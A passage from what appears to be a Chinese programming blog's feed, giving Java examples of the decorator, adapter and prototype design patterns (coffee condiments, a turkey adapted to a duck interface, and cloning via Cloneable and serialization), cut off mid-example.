&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DecoratorTester&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 创建被装饰对象
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Beverage beverage &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Decaf&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;decaf&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>beverage&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>beverage&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDescription&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// 客户要求添加牛奶
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Decorator milkDecaf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Milk&lt;span style="color:#f92672">(&lt;/span>beverage&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>milkDecaf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>milkDecaf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDescription&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// 客户还要求添加抹茶
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Decorator mochaMilkDecaf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Mocha&lt;span style="color:#f92672">(&lt;/span>milkDecaf&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>mochaMilkDecaf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>mochaMilkDecaf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDescription&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#ae81ff">30&lt;/span>
decaf
&lt;span style="color:#ae81ff">35&lt;/span>
牛奶decaf
&lt;span style="color:#ae81ff">41&lt;/span>
抹茶牛奶decaf
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过装饰器模式，动态的给被装饰对象加上了不同的行为。
现在，让我们来回想一下将来可能出现的业务变动&lt;/p>
&lt;ul>
&lt;li>如果调料的价格发生变动。
不需要修改超类的代码。我们唯一需要做的就是重新创建一个新的调料类，然后在装饰对象时使用它就可以了。&lt;/li>
&lt;li>如果将来加入新的调料。
同上。你只需要创建新的调料对象。&lt;/li>
&lt;li>如果顾客需要双倍摩卡的咖啡我们应该怎么办？
太容易了，包装两次！&lt;/li>
&lt;li>超类中包含的调料似乎并不能和所有饮料所吻合。
不吻合的情况下则不包装即可！例如你不可能拥有奶泡碧螺春。&lt;/li>
&lt;/ul>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>本篇文章的总结很简单，你需要做的就是回顾一下上面所提到过的装饰器设计模式的特性，并尝试理解它。&lt;/p>
&lt;ol>
&lt;li>装饰器和被装饰对象具有相同的超类型。装饰器并非一定要是抽象类，也可以是一个接口。&lt;/li>
&lt;li>你可以用一个或多个装饰器包装一个被装饰对象。&lt;/li>
&lt;li>装饰器和被装饰对象都用有同样的超类型。对于客户端来说，使用装饰器和被装饰对象，都应该拥有一样的体验。&lt;/li>
&lt;li>装饰者可以在所委托被装饰者的行为之前、或之后，加上自己的行为。&lt;/li>
&lt;li>对象可以动态的，任何时候被你的装饰器所装饰。&lt;/li>
&lt;/ol></description></item><item><title>适配器设计模式</title><link>https://www.chucklin.net/post/adpater_designmode/</link><pubDate>Thu, 04 Jan 2018 11:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/adpater_designmode/</guid><description>&lt;h2 id="什么是适配器设计模式">什么是适配器设计模式&lt;/h2>
&lt;p>将一个类的接口，转换成客户期望的另一个接口。适配器让原本接口不兼容的类可以合作无间。&lt;/p>
&lt;h2 id="为什么要使用适配器设计模式">为什么要使用适配器设计模式&lt;/h2>
&lt;p>适配器设计模式能够解决的问题，与现实生活中的适配器的用处基本上是一样的。&lt;/p>
&lt;h2 id="适配器设计模式怎么用">适配器设计模式怎么用&lt;/h2>
&lt;p>试想这样一种业务情况。
2001 年，你现在就职的公司为了负责开发了某著名游戏公司所设计的新游戏中的一个模块，而这个模块系统中有一个 duck 类，这个类与其它各种类被打包成 jar 提供给了游戏厂商的系统所使用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 适配器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 期望对象接口
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Duck&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 适配器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 期望对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MallardDuck&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Duck &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;gua gua&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;let me fly&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>时过境迁，公司为了适应市场激烈的变化，推出了大量新产品，并设计了许许多多的其它的类。这些新设计的类，有些继承了 Duck 的结构，有些则是独立的、全新的类。比如下面这个全新的火鸡角色。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 适配器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 被适配对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Turkey&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">gobble&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 适配器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 被适配对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">WildTurkey&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Turkey &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">gobble&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;gobble gobble&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;let me fly&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>为了让这款曾经的老游戏焕发新的活力。曾经的接口必需适应新产品的结构才行。要达到这样的目的，有两个方法&lt;/p>
&lt;ul>
&lt;li>通知曾经的游戏厂商，为了我司全新的游戏产品重新设计游戏接口。&lt;/li>
&lt;li>想办法让我司的新产品能够适应老旧的游戏厂商接口。&lt;/li>
&lt;/ul>
&lt;p>第一个方法显然是不现实的。所以，我们需要采用适配器设计模式，让它帮助我们使新产品能够运用到旧的接口上去。
适配器类要做的工作非常简单。持有被适配对象的引用，并实现期望对象接口就可以了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 适配器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 适配器对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">TurkeyAdapter&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Duck &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> Turkey turkey&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">TurkeyAdapter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Turkey turkey&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">turkey&lt;/span> &lt;span style="color:#f92672">=&lt;/span> turkey&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
turkey&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">gobble&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
turkey&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通知厂商在新的游戏系统中加上全新的火鸡角色，让这款游戏变得更加丰富多彩。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 适配器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 客户端
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Duck duck &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MallardDuck&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
duck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
duck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
duck &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TurkeyAdapter&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> WildTurkey&lt;span style="color:#f92672">());&lt;/span>
duck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
duck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>let me fly
gua gua
let me fly
gobble obble
&lt;/code>&lt;/pre>&lt;p>将上面的思路与代码做一下归纳与整理，适配器设计模式的类图也就迎刃而出了。最后通过 UML 类图再来加深一下对适配器设计模式的印象。
&lt;img src="http://static.zybuluo.com/mikumikulch/p3u4nb8cck49jkz92go8v62a/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-01-10%20%E4%B8%8B%E5%8D%886.19.42.png" alt="屏幕快照 2017-01-10 下午6.19.42.png-19.7kB">&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>适配器设计模式理解与运用上都比较简单。值得注意的是：适配器设计模式乍看起来与装饰器设计模式，但是这两个设计模式对应处理的是完全不同的问题。
装饰器设计模式的重点在于动态的为对象添加责任，并且被装饰对象的结构，接口必需与组件相同，并且在装饰过程中，被装饰对象与组建的接口不能发生变化。
而适配器设计模式的重点在于将不匹配的接口通过封装，将被适配对象的接口改变成为所期望的接口。&lt;/p></description></item><item><title>原型设计模式</title><link>https://www.chucklin.net/post/prototype_designmode/</link><pubDate>Wed, 03 Jan 2018 14:01:23 +0800</pubDate><guid>https://www.chucklin.net/post/prototype_designmode/</guid><description>&lt;h2 id="什么是原型设计模式">什么是原型设计模式&lt;/h2>
&lt;p>用原型实例指定创建对象的种类，并通过拷贝这些原型创建包含了原对象中所有信息的新的对象。
原型设计模式在某种条件下，是一种非常危险的，难以驾驭的设计模式。使用应该慎之又慎。&lt;/p>
&lt;h2 id="原型设计模式怎么用">原型设计模式怎么用&lt;/h2>
&lt;p>原型设计模式没有复杂的概念，它就是用来拷贝对象的。
在 java 中若想使一个对象能够被拷贝，基本上有下面这几种方法：&lt;/p>
&lt;ul>
&lt;li>实现 Cloneable 接口。&lt;/li>
&lt;li>重写 clone() 方法，并调用 super.clone() 方法获取到拷贝对象&lt;/li>
&lt;li>若目标对象包含复杂对象引用，则继续调用引用对象的 clone() 方法，再将结果 set 到目标对象上去。&lt;/li>
&lt;li>针对复杂的，引用较深的对象，使用内存流+序列化的方式，直接获取到完全拷贝对象。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 原型设计模式
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Prototype&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Cloneable&lt;span style="color:#f92672">,&lt;/span> Serializable &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> serialVersionUID &lt;span style="color:#f92672">=&lt;/span> 8196154781151609930L&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> arrayList &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> Object&lt;span style="color:#f92672">[]&lt;/span> models &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> Object&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Object&lt;span style="color:#f92672">()};&lt;/span>
&lt;span style="color:#75715e">// final与clone价架构不兼容。因为你无法在初始化以外的地方改变final的引用
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> Prototype prototype &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Prototype&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 重写Object的clone方法
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> * @throws CloneNotSupportedException
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">clone&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> CloneNotSupportedException &lt;span style="color:#f92672">{&lt;/span>
Prototype prototype &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Prototype&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">clone&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
prototype&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">arrayList&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>ArrayList&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;)&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">arrayList&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">clone&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
prototype&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">models&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">models&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">clone&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">//this.prototype = (Prototype) prototype.clone();
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> prototype&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 通过对象序列化进行深拷贝
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Prototype &lt;span style="color:#a6e22e">deepClone&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ClassNotFoundException &lt;span style="color:#f92672">{&lt;/span>
ByteArrayOutputStream bos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ByteArrayOutputStream&lt;span style="color:#f92672">();&lt;/span>
ObjectOutputStream outputStream &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectOutputStream&lt;span style="color:#f92672">(&lt;/span>bos&lt;span style="color:#f92672">);&lt;/span>
outputStream&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
ByteArrayInputStream bis &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ByteArrayInputStream&lt;span style="color:#f92672">(&lt;/span>bos&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toByteArray&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
ObjectInputStream ois &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectInputStream&lt;span style="color:#f92672">(&lt;/span>bis&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Prototype&lt;span style="color:#f92672">)&lt;/span> ois&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="原型设计模式的设计缺陷和安全隐患">原型设计模式的设计缺陷和安全隐患&lt;/h2>
&lt;p>为什么文章开头说，原型设计模式在某种条件下，是一种非常危险的，难以驾驭的设计模式？这需要从 Cloneable 接口糟糕的设计说起。&lt;/p>
&lt;p>首先，Cloneable 接口没有包含任何方法，实现它的作用是改变了他的父类中受保护的 clone 方法的实现行为，使得 Object 的 clone 方法能够返回一个拷贝对象。这样的接口设计颠覆了 java 的接口设计理念。
往往实现一个接口，是为了告诉客户这个类能够为他做些什么。而 Cloneable 却改变了父类的 clone 方法的行为。这样极端的做法，基本上可以用匪夷所思来形容。&lt;/p>
&lt;p>其次，调用了 java 语言以外的方法创建了对象，同时深拷贝浅拷贝的问题带来了巨大的安全隐患。比如下面这一段代码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 测试
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param args
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Prototype prototype &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Prototype&lt;span style="color:#f92672">();&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>prototype&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">models&lt;/span>&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">]);&lt;/span>
Object object1 &lt;span style="color:#f92672">=&lt;/span> prototype&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">models&lt;/span>&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">];&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Prototype clonePrototype &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Prototype&lt;span style="color:#f92672">)&lt;/span> prototype&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">clone&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
